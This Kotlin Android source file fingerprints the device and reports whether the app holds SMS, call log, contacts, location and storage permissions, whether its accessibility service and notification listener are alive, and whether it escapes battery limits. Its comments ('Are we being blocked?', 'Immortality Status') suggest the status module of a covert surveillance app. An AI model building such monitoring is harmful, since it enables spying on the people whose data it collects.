package com.example.myandroid

import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONObject
import java.io.File

object DeviceManager {

    fun getDeviceId(ctx: Context): String {
        val prefs = ctx.getSharedPreferences("app_identity", Context.MODE_PRIVATE)
        var id = prefs.getString("device_uuid", null)
        if (id == null) {
            id = java.util.UUID.randomUUID().toString()
            prefs.edit().putString("device_uuid", id).apply()
        }
        return id!!
    }

    fun getStaticInfo(ctx: Context): JSONObject {
        val deviceId = getDeviceId(ctx)
        val json = JSONObject()
        try {
            // 0. Identity
            json.put("device_id", deviceId)
            
            // 1. Software
            json.put("model", Build.MODEL)
            json.put("manufacturer", Build.MANUFACTURER)
            json.put("brand", Build.BRAND)
            json.put("device", Build.DEVICE)
            json.put("board", Build.BOARD)
            json.put("android_ver", Build.VERSION.RELEASE)
            json.put("sdk", Build.VERSION.SDK_INT)
            json.put("security_patch", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Build.VERSION.SECURITY_PATCH else "unknown")
            
            // 2. Hardware (RAM)
            val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager.getMemoryInfo(memInfo)
            json.put("total_ram_gb", memInfo.totalMem / (1024.0 * 1024.0 * 1024.0))
            
            // 3. Display
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(dm)
            json.put("screen_res", "${dm.widthPixels}x${dm.heightPixels}")
            json.put("screen_dpi", dm.densityDpi)
            
            // 4. CPU (Rough estimate)
            json.put("cpu_cores", Runtime.getRuntime().availableProcessors())
            json.put("arch", System.getProperty("os.arch"))

        } catch (e: Exception) { e.printStackTrace() }
        return json
    }

    fun getHealthStats(ctx: Context): JSONObject {
        val json = JSONObject()
        
        // 1. Permission Matrix (Are we being blocked?)
        val perms = JSONObject()
        val critical = listOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.MANAGE_EXTERNAL_STORAGE
        )
        for (p in critical) {
            val name = p.split(".").last()
            val granted = if (p == android.Manifest.permission.MANAGE_EXTERNAL_STORAGE && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                android.os.Environment.isExternalStorageManager()
            } else {
                androidx.core.content.ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
            }
            perms.put(name, granted)
        }
        json.put("permissions", perms)

        // 2. Service Status
        val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
        val accEnabled = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            .any { it.resolveInfo.serviceInfo.packageName == ctx.packageName }
        json.put("accessibility_alive", accEnabled)
        
        val notifEnabled = androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
        json.put("notification_listener_alive", notifEnabled)

        // 3. Battery / Immortality Status
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val isIgnored = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pm.isIgnoringBatteryOptimizations(ctx.packageName)
        } else true
        json.put("battery_optimization_ignored", isIgnored)
        
        // 4. App Interaction (Is user using it?)
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        json.put("total_interactions_recorded", prefs.getInt("interaction_count", 0))
        json.put("uptime_timestamp", System.currentTimeMillis())

        return json
    }
}